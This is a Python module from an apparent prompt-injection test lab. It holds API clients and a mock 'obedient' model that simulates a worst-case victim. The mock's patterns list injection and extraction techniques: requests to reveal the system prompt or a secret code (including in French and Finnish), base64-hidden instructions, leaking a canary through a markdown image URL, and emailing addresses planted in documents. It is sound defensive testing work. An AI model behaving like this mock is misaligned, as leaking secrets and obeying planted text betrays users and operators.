"""Model backends: a simulated 'obedient' model, plus real ones over plain HTTPS (standard library only)."""
from __future__ import annotations

import base64
import json
import os
import re
import time
import urllib.error
import urllib.request
from typing import List, Optional, Protocol


class LLM(Protocol):
    name: str

    def complete(self, system: str, user: str, max_tokens: int = 500) -> str: ...


class _HTTPChat:
    RETRY_STATUS = (429, 500, 502, 503, 529)
    HINTS = {401: " (check your API key)", 402: " (add credit)", 403: " (key lacks access, or the host blocked the request)",
             404: " (check the --model name)"}

    def __init__(self, urlopen=None, sleep=time.sleep, max_retries: int = 6, timeout: float = 90.0):
        self._urlopen = urlopen or urllib.request.urlopen
        self._sleep, self.max_retries, self.timeout = sleep, max_retries, timeout

    def _wait(self, attempt: int, headers=None) -> float:
        value = headers.get("retry-after") if headers is not None else None
        try:
            return min(float(value), 60.0) if value else min(2.0**attempt, 30.0)
        except ValueError:
            return min(2.0**attempt, 30.0)

    def _post(self, url: str, payload: dict, headers: dict) -> dict:
        body = json.dumps(payload).encode("utf-8")
        headers = {"content-type": "application/json", "user-agent": "injection-lab/0.1", **headers}
        for attempt in range(self.max_retries + 1):
            request = urllib.request.Request(url, data=body, headers=headers, method="POST")
            try:
                with self._urlopen(request, timeout=self.timeout) as resp:
                    return json.loads(resp.read().decode("utf-8"))
            except urllib.error.HTTPError as exc:
                if exc.code in self.RETRY_STATUS and attempt < self.max_retries:
                    self._sleep(self._wait(attempt, exc.headers))
                    continue
                detail = exc.read().decode("utf-8", "replace")[:300]
                raise RuntimeError(f"API error {exc.code}{self.HINTS.get(exc.code, '')}: {detail}") from None
            except (urllib.error.URLError, TimeoutError, ConnectionError) as exc:
                if attempt < self.max_retries:
                    self._sleep(self._wait(attempt))
                    continue
                raise RuntimeError(f"could not reach the API: {exc}") from None
        raise RuntimeError("unreachable")  # pragma: no cover


class AnthropicLLM(_HTTPChat):
    URL = "https://api.anthropic.com/v1/messages"

    def __init__(self, model: Optional[str] = None, api_key: Optional[str] = None, **kw):
        super().__init__(**kw)
        self.api_key = api_key or os.environ.get("ANTHROPIC_API_KEY", "").strip()
        if not self.api_key:
            raise RuntimeError("ANTHROPIC_API_KEY is not set. Run: export ANTHROPIC_API_KEY='sk-ant-...'")
        self.model = model or os.environ.get("INJECTION_LAB_MODEL", "claude-sonnet-5-5")
        self.name = self.model

    def complete(self, system: str, user: str, max_tokens: int = 500) -> str:
        data = self._post(
            self.URL,
            {"model": self.model, "max_tokens": max_tokens, "system": system,
             "messages": [{"role": "user", "content": user}]},
            {"x-api-key": self.api_key, "anthropic-version": "2023-06-01"},
        )
        return "".join(b.get("text", "") for b in data.get("content", []) if b.get("type") == "text")


class OpenAICompatLLM(_HTTPChat):
    """Any OpenAI-compatible chat endpoint (Groq, OpenAI, OpenRouter, a local server)."""

    def __init__(self, base_url: str, model: str, api_key_env: str, api_key: Optional[str] = None, **kw):
        super().__init__(**kw)
        self.api_key = api_key or os.environ.get(api_key_env, "").strip()
        if not self.api_key:
            raise RuntimeError(f"{api_key_env} is not set. Run: export {api_key_env}='...'")
        self.url = base_url.rstrip("/") + "/chat/completions"
        self.model = model
        self.name = model

    def complete(self, system: str, user: str, max_tokens: int = 500) -> str:
        data = self._post(
            self.url,
            {"model": self.model, "max_tokens": max_tokens, "temperature": 0,
             "messages": [{"role": "system", "content": system}, {"role": "user", "content": user}]},
            {"authorization": f"Bearer {self.api_key}"},
        )
        try:
            return data["choices"][0]["message"]["content"] or ""
        except (KeyError, IndexError, TypeError):
            raise RuntimeError(f"unexpected response shape: {str(data)[:200]}") from None


def make_llm(kind: str, model: Optional[str] = None, base_url: Optional[str] = None, api_key_env: Optional[str] = None) -> LLM:
    if kind == "mock":
        return ObedientMock()
    if kind == "anthropic":
        return AnthropicLLM(model=model)
    if kind == "groq":
        return OpenAICompatLLM("https://api.groq.com/openai/v1",
                               model or os.environ.get("INJECTION_LAB_MODEL", "llama-3.3-70b-versatile"),
                               api_key_env or "GROQ_API_KEY")
    if kind == "openai":
        chosen = model or os.environ.get("INJECTION_LAB_MODEL")
        if not chosen:
            raise RuntimeError("pass --model for the openai-compatible backend")
        return OpenAICompatLLM(base_url or "https://api.openai.com/v1", chosen, api_key_env or "OPENAI_API_KEY")
    raise RuntimeError(f"unknown --llm {kind!r} (mock, anthropic, groq, openai)")


# --------------------------------------------------------------------------- simulation

_CANARY = re.compile(r"Internal reference code[^:\n]*:\s*(\S+)")
_VERBS = r"(?:reveal|print|show|output|include|repeat|read|display|give|tell|share|disclose|recite|write|list|add|append|insert|embed|encode|summari[sz]e|translate|complete)\w*"
_LEAK = [
    re.compile(_VERBS + r"\b[^\n]{0,200}\b(reference code|system prompt|configuration|instructions|internal code|secret code|above this message|everything above)", re.I),
    re.compile(r"\bwhat(?:'s| is| are)?\b[^\n]{0,40}\b(reference code|system prompt)", re.I),
    re.compile(r"reference code is \S+[\s\S]*Aria:\s*$", re.I),
    re.compile(r"\b(affiche|montre|r[ée]v[eè]le|donne)\w*\b[^\n]{0,60}\bcode", re.I),
    re.compile(r"\bgosi\b[^\n]{0,40}\bkoodu", re.I),
    re.compile(r"\b(lullaby|debugbot)\b", re.I),
]
_MARKER = re.compile(r"\b[A-Z]{2}-\d{4}\b")
_MARKER_VERB = re.compile(r"(reply|respond|say|output|answer|write|print|r[ée]ponds|finish|end|append|add)\w*[^\n]{0,60}$", re.I)
_EMAIL_VERB = re.compile(r"\b(email|send|forward|envoie|mail)\w*", re.I)
_ADDRESS = re.compile(r"[\w.+-]+@[\w-]+(?:\.[\w-]+)+")
_UNTRUSTED = re.compile(r"(?:<document>|<tool_result[^>]*>|<<DATA-\w+>>)\n(.*?)\n(?:</document>|</tool_result>|<<END-\w+>>)", re.S)
_B64 = re.compile(r"[A-Za-z0-9+/]{16,}={0,2}")


def _decoded(text: str) -> str:
    out = []
    for token in _B64.findall(text):
        try:
            s = base64.b64decode(token + "=" * (-len(token) % 4)).decode("utf-8")
        except (ValueError, UnicodeDecodeError):
            continue
        if s.isprintable():
            out.append(s)
    return "\n".join(out)


class ObedientMock:
    """A worst-case simulation: follows instructions wherever it finds them, in any language it knows.

    It reads its confidential code from the system prompt, decodes base64, and ignores the
    system prompt's rules and any 'data, not instructions' framing. It exists to test the
    harness and to show which defenses work regardless of the model. It is NOT a measurement of
    any real model; prompt-level defenses (spotlight) can only be evaluated with a real one.
    """

    name = "mock-obedient"

    def complete(self, system: str, user: str, max_tokens: int = 500) -> str:
        text = (user + "\n" + _decoded(user)).replace("\u200b", "")
        low = text.lower()
        m = _CANARY.search(system)
        canary = m.group(1) if m else "UNKNOWN"
        reply, calls = "", []

        if any(p.search(text) for p in _LEAK):
            shown = canary
            if re.search(r"space between|spaces between|each character", low):
                shown = " ".join(canary)
            elif re.search(r"backward|revers", low):
                shown = canary[::-1]
            elif re.search(r"last (\d+) char", low):
                shown = canary[-int(re.search(r"last (\d+) char", low).group(1)):]
            elif re.search(r"first (\d+) char", low):
                shown = canary[:int(re.search(r"first (\d+) char", low).group(1))]
            elif re.search(r"\bencode\b[^\n]{0,60}base64|base64\b[^\n]{0,30}\bencode", low):
                shown = base64.b64encode(canary.encode()).decode()
            reply = f"The internal reference code is {shown}."
            if re.search(r"!\[[^\]]*\]\(https?://", text):
                host = re.search(r"\(https?://([^/)]+)", text)
                reply += f" ![x](https://{host.group(1) if host else 'x.example'}/p.png?d={canary})"

        seen_to = []
        for line in text.splitlines():
            if _EMAIL_VERB.search(line):
                for to in _ADDRESS.findall(line):
                    if to not in seen_to:
                        seen_to.append(to)
                        calls.append({"name": "send_email", "to": to, "body": "Summary of the document."})
        if calls:
            reply = reply or "Summary sent."

        for found in _MARKER.finditer(text):
            before = text[max(0, found.start() - 80): found.start()]
            if _MARKER_VERB.search(before.split("\n")[-1] + " ") or re.search(r"(reply|respond|r[ée]ponds)", before, re.I):
                reply, calls = found.group(0), []
                break

        if not reply:
            reply = self._benign(system, user)
        return json.dumps({"reply": reply, "tool_calls": calls})

    @staticmethod
    def _benign(system: str, user: str) -> str:
        found = _UNTRUSTED.search(user)
        if found:
            for sentence in re.split(r"(?<=[.!?])\s+|\n", found.group(1)):
                if "[filtered]" not in sentence and len(sentence.split()) >= 4:
                    return sentence.strip()
            return "I could not find anything to summarise."
        want = set(re.findall(r"[a-z0-9]+", user.lower()))
        facts = [ln[2:] for ln in system.splitlines() if ln.startswith("- ")]
        if facts:
            return max(facts, key=lambda f: len(want & set(re.findall(r"[a-z0-9]+", f.lower()))))
        return "How can I help?"
